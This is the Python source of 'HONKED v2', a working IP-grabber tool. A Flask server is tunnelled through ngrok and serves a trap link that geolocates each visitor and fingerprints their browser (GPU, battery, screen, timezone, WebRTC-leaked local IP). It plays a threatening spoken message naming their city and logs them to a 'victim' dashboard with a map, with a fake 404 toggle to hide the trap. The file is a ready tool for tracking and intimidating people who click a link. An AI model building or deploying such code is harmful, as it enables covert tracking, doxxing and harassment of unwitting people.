import webview
import requests
import threading
import pyperclip
import os
import sys
import json
from flask import Flask, request, send_from_directory, jsonify
from pyngrok import ngrok, conf

# --- 1. CONFIG & STATE ---
CLUSTER_KEYS = [
    "API_KEY_1",
    "API_KEY_2",
    "API_KEY_3"
]

flask_app = Flask(__name__)
state = {
    "active_url": "NOT_STARTED",
    "current_key_index": 0,
    "victims": [], 
    "hit_count": 0,
    "status": "ACTIVE"
}

window = None

@flask_app.route('/music.mp3')
def serve_music():
    return send_from_directory(os.getcwd(), 'music.mp3')

# --- 2. THE TRAP (VICTIM END) ---
@flask_app.route('/log_details', methods=['POST'])
def log_details():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    for vic in state["victims"]:
        if vic["ip"] == ip and vic["ua"] == "Pending...":
            vic.update(data)
            break
            
    msg = f"[+] INTEL RCVD: {ip} | LOCAL: {data.get('local_ip')} | {data.get('res')}"
    if window:
        window.evaluate_js(f"pushTerminal('{msg}'); updateVictimList({json.dumps(state['victims'])});")
    return jsonify({"status": "ok"})

@flask_app.route('/')
@flask_app.route('/login')
def capture():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    res_data = {}
    
    # Check if we should serve the fake 404 first
    if state["status"] == "OFFLINE":
        return """<html><body style="background:#000;color:#444;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;">
                  <div style="text-align:center;"><p>404 - SESSION EXPIRED</p><small>Nothing to see here.</small></div></body></html>"""

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if res.get('status') == 'success':
            res_data = res
            vic_data = {
                "id": state["hit_count"] + 1,
                "ip": ip,
                "city": res.get('city'),
                "region": res.get('regionName'),
                "isp": res.get('isp'),
                "lat": res.get('lat'),
                "lon": res.get('lon'),
                "ua": "Pending...",
                "gpu": "Pending...",
                "batt": "Pending...",
                "res": "Pending...",
                "local_ip": "Pending..."
            }
            state["victims"].append(vic_data)
            state["hit_count"] += 1
            msg = f"[!] NEW VICTIM: {ip} ({res.get('city')})"
            if window: 
                window.evaluate_js(f"pushTerminal('{msg}'); updateRadar({json.dumps(vic_data)}); updateHitCount({state['hit_count']}); updateVictimList({json.dumps(state['victims'])});")
    except Exception as e:
        print(f"Error capturing: {e}")

    return f"""
    <html><head><style>
        body {{ background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; margin:0; cursor: pointer; transition: filter 0.1s; }}
        .matrix-bg {{ position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; opacity:0.3; }}
        .box {{ border:2px solid #0f0; padding:60px; text-align:center; box-shadow:0 0 30px #0f0; background:rgba(0,0,0,0.9); display: flex; flex-direction: column; justify-content: space-between; min-height: 300px; position: relative; }}
        .alert {{ color: #fff; background: #f00; padding: 20px; font-size: 3.5rem; font-weight: 900; margin: 0; animation: blink 0.6s infinite, glitch 2s infinite; }}
        .bottom-text {{ color: #0f0; font-size: 2rem; font-weight: bold; margin-top: auto; text-transform: uppercase; letter-spacing: 2px; }}
        @keyframes blink {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0; }} 100% {{ opacity: 1; }} }}
        @keyframes glitch {{
            0% {{ transform: translate(0); }}
            20% {{ transform: translate(-5px, 5px); }}
            40% {{ transform: translate(-5px, -5px); }}
            60% {{ transform: translate(5px, 5px); }}
            80% {{ transform: translate(5px, -5px); }}
            100% {{ transform: translate(0); }}
        }}
        .shake {{ animation: glitch 0.1s infinite; filter: invert(1); }}
    </style></head>
    <body onclick="initInteract()">
    <canvas id="m" class="matrix-bg"></canvas>
    <div class="box" id="mainBox">
        <h1 class="alert">YOU GOT HONKED</h1>
        <p class="bottom-text">I KNOW WHERE U AT BRO 🥀 | HONKED BY CAPPIAVI</p>
        <p style="color:#555; font-size:10px; margin-top:10px;">(Click anywhere to continue)</p>
    </div>
    <audio id="bgMusic" loop><source src="/music.mp3" type="audio/mpeg"></audio>
    <script>
        let hasInteracted = false;
        async function initInteract() {{ 
            if(hasInteracted) return;
            hasInteracted = true;
            
            triggerGlitches();

            let gpuName = "Generic GPU";
            try {{
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpuName = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('/')[0];
            }} catch(e){{}}

            let msg = new SpeechSynthesisUtterance("System compromised. I see your " + gpuName + " in {res_data.get('city', 'your city')}. There is no escape.");
            msg.rate = 0.7;
            msg.pitch = 0.1;
            
            msg.onend = function() {{
                document.getElementById("bgMusic").play().catch(e => {{}}); 
            }};
            
            window.speechSynthesis.speak(msg);
        }}

        function triggerGlitches() {{
            setInterval(() => {{
                if(Math.random() > 0.9) {{
                    document.body.classList.add('shake');
                    setTimeout(() => document.body.classList.remove('shake'), 200);
                }}
            }}, 500);
        }}
        
        async function getLocalIP() {{
            return new Promise((resolve) => {{
                const pc = new RTCPeerConnection({{iceServers:[]}});
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (i) => {{
                    if (!i || !i.candidate || !i.candidate.candidate) return;
                    const ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate)[1];
                    resolve(ip);
                }};
                setTimeout(() => resolve("N/A"), 1000);
            }});
        }}

        async function fingerPrint() {{
            let gpu = "N/A";
            try {{ 
                const canvas = document.createElement('canvas'); 
                const gl = canvas.getContext('webgl'); 
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL); 
            }} catch(e){{}}
            
            let batt = "N/A";
            try {{ const b = await navigator.getBattery(); batt = (Math.round(b.level * 100)) + "%"; }} catch(e){{}}
            
            const localIp = await getLocalIP();

            const specs = {{
                ua: navigator.userAgent,
                platform: navigator.platform,
                gpu: gpu,
                batt: batt,
                res: window.screen.width + "x" + window.screen.height,
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                local_ip: localIp
            }};
            fetch('/log_details', {{ method: 'POST', headers: {{'Content-Type': 'application/json'}}, body: JSON.stringify(specs) }});
        }}
        fingerPrint();

        const c=document.getElementById('m'), x=c.getContext('2d');
        c.width=window.innerWidth; c.height=window.innerHeight;
        const s="0101HONKED", d=Array(Math.floor(c.width/10)).fill(1);
        function draw(){{ x.fillStyle="rgba(0,0,0,0.05)"; x.fillRect(0,0,c.width,c.height); x.fillStyle="#0f0";
        d.forEach((y,i)=>{{ x.fillText(s[Math.floor(Math.random()*s.length)], i*10, y*10); if(y*10>c.height&&Math.random()>0.975) d[i]=0; d[i]++; }}); }}
        setInterval(draw, 33);
    </script></body></html>"""

# --- 3. BACKEND API ---
class API:
    def boot_failover(self):
        def _launch():
            idx = state["current_key_index"]
            if idx >= len(CLUSTER_KEYS):
                window.evaluate_js("pushTerminal('[ERROR] All keys exhausted.')")
                return
            try:
                conf.get_default().auth_token = CLUSTER_KEYS[idx]
                tunnels = ngrok.get_tunnels()
                for t in tunnels: ngrok.disconnect(t.public_url)
                u = ngrok.connect(5000).public_url
                state["active_url"] = u 
                pyperclip.copy(u) 
                window.evaluate_js(f"updateStatusDisplay('{state['active_url']}')")
                window.evaluate_js(f"pushTerminal('[SYSTEM] Uplink 0{idx+1} Online. Link copied to clipboard.')")
            except Exception as e:
                window.evaluate_js(f"pushTerminal('[RETRY] Key 0{idx+1} failed...')")
                state["current_key_index"] += 1
                self.boot_failover()
        threading.Thread(target=_launch, daemon=True).start()
        return "Booting..."

    def toggle_victim_view(self):
        state["status"] = "ACTIVE" if state["status"] == "OFFLINE" else "OFFLINE"
        return state["status"]

    def copy_link(self):
        if "http" in state["active_url"]:
            pyperclip.copy(state["active_url"])
            return True
        return False

    def shutdown_all(self):
        try: ngrok.kill()
        except: pass
        os._exit(0)

# --- 4. CONTROL UI ---
ui = """
<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { background:#050505; color:#0f0; font-family:monospace; margin:0; display:flex; height:100vh; overflow:hidden; }
        #side { width:360px; background:#000; border-right:1px solid #0f0; padding:15px; display:flex; flex-direction:column; gap:10px; }
        #main { flex-grow:1; display:flex; flex-direction:column; }
        #map { height:40%; border-bottom:1px solid #0f0; background:#000; }
        #term { flex-grow:1; background:#000; padding:15px; overflow-y:auto; font-size:11px; color:#0f0; white-space: pre-wrap; border-top:1px solid #222; }
        .mod { border:1px solid #0f0; padding:10px; background: rgba(0,255,0,0.02); }
        
        #victim-db { flex-grow: 1; min-height: 350px; overflow-y: scroll; border: 1px solid #333; padding: 5px; background: #050505; }
        .vic-card { border-bottom: 1px solid #222; padding: 12px 5px; font-size: 11px; line-height: 1.5; }
        .vic-card:hover { background: #111; }
        .vic-ip { color: #fff; font-weight: bold; border-left: 2px solid #0f0; padding-left: 8px; margin-bottom: 4px; }
        .vic-loc { color: #f0f; font-weight: bold; }

        button { background:transparent; border:1px solid #0f0; color:#0f0; width:100%; padding:8px; cursor:pointer; margin-top:5px; font-family:monospace; text-transform:uppercase; font-size:10px; }
        button:hover { background:#0f0; color:#000; }
        .btn-danger { border-color: #f00; color: #f00; font-weight: bold; margin-top: auto; }
        .btn-danger:hover { background: #f00; color: #000; }
        .status-box { text-align:center; padding:10px; font-weight:bold; border:2px solid #0f0; transition: 0.3s; }
        .hit-counter { font-size: 24px; color: #fff; text-shadow: 0 0 10px #0f0; margin: 5px 0; border: 1px dashed #0f0; padding: 5px; text-align: center; }
        
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-thumb { background: #0f0; }
    </style>
</head>
<body>
    <div id="side">
        <h2 style="margin:0; text-align:center; color:#fff; letter-spacing:5px;">HONKED v2</h2>
        <div id="stat-ui" class="status-box">SYSTEM STANDBY</div>
        
        <div class="mod">
            <small>TOTAL COMPROMISED</small>
            <div id="hit-count" class="hit-counter">0</div>
        </div>

        <div class="mod" style="flex-grow:1; display:flex; flex-direction:column; overflow: hidden;">
            <small>LIVE VICTIM FEED</small>
            <div id="victim-db">
                <div style="color:#444; text-align:center; margin-top:50px;">Awaiting Uplink...</div>
            </div>
        </div>

        <div class="mod">
            <button onclick="window.pywebview.api.boot_failover()">ESTABLISH UPLINK</button>
            <button onclick="copyCurrentLink()">COPY TRAP LINK</button>
            <div id="url-display" style="font-size:9px; margin-top:5px; word-break:break-all; color:#555; text-align:center;">---</div>
        </div>
        <div class="mod">
            <button id="view-toggle" onclick="toggleView()">SET TO: OFFLINE</button>
        </div>
        <button class="btn-danger" onclick="window.pywebview.api.shutdown_all()">SHUTDOWN SERVER</button>
    </div>
    <div id="main"><div id="map"></div><div id="term">>> INITIALIZING RADAR...</div></div>
    <script>
        let map = L.map('map', {zoomControl:false, attributionControl:false}).setView([20,0], 2);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
        
        let markers = [];
        const greenIcon = L.divIcon({ className: 'c-icon', html: "<div style='width:14px;height:14px;background:#0f0;border-radius:50%;box-shadow:0 0 8px #0f0;'></div>", iconSize: [14, 14], iconAnchor: [7, 7] });
        const redIcon = L.divIcon({ className: 'c-icon', html: "<div style='width:22px;height:22px;background:#f00;border-radius:50%;border:2px solid #fff;box-shadow:0 0 15px #f00;'></div>", iconSize: [22, 22], iconAnchor: [11, 11] });

        function pushTerminal(m) { const t = document.getElementById('term'); t.innerText += "\\n> " + m; t.scrollTop = t.scrollHeight; }
        function updateHitCount(n) { document.getElementById('hit-count').innerText = n; }

        function updateVictimList(victims) {
            const db = document.getElementById('victim-db');
            db.innerHTML = "";
            [...victims].reverse().forEach(v => {
                db.innerHTML += `
                    <div class="vic-card">
                        <div class="vic-ip">IP: ${v.ip}</div>
                        <div style="padding-left:10px;">
                            <span class="vic-loc">${v.city || 'Unknown'}, ${v.region || ''}</span><br>
                            <span style="color:#0f0">LOCAL:</span> ${v.local_ip || '...'}<br>
                            <span style="color:#aaa">GPU:</span> <span style="color:#eee">${v.gpu ? v.gpu.substring(0,40) : '...'}</span><br>
                            <span style="color:#aaa">BATT:</span> ${v.batt} | <span style="color:#aaa">RES:</span> ${v.res}
                        </div>
                    </div>
                `;
            });
        }

        function updateStatusDisplay(url) {
            const box = document.getElementById('stat-ui'); box.innerText = "ONLINE"; box.style.background = "#0f0"; box.style.color = "#000";
            document.getElementById('url-display').innerText = url;
        }

        function toggleView() {
            window.pywebview.api.toggle_victim_view().then(status => {
                document.getElementById('view-toggle').innerText = status === "ACTIVE" ? "SET TO: OFFLINE" : "SET TO: HONKED";
                pushTerminal("Status changed to: " + status);
            });
        }

        function copyCurrentLink() { window.pywebview.api.copy_link().then(s => { if(s) pushTerminal("Link Copied."); }); }
        
        function updateRadar(d) {
            if(d.lat) {
                markers.forEach(m => m.setIcon(greenIcon));
                let newM = L.marker([d.lat, d.lon], {icon: redIcon}).addTo(map)
                    .bindPopup("<b>NEW HIT:</b> "+d.ip+"<br><b>CITY:</b> "+d.city).openPopup();
                markers.push(newM);
                map.flyTo([d.lat, d.lon], 7);
            }
        }
    </script>
</body></html>
"""

if __name__ == "__main__":
    threading.Thread(target=lambda: flask_app.run(port=5000, use_reloader=False), daemon=True).start()
    window = webview.create_window('HONKED CONTROL PANEL', html=ui, width=1200, height=800, js_api=API())
    webview.start()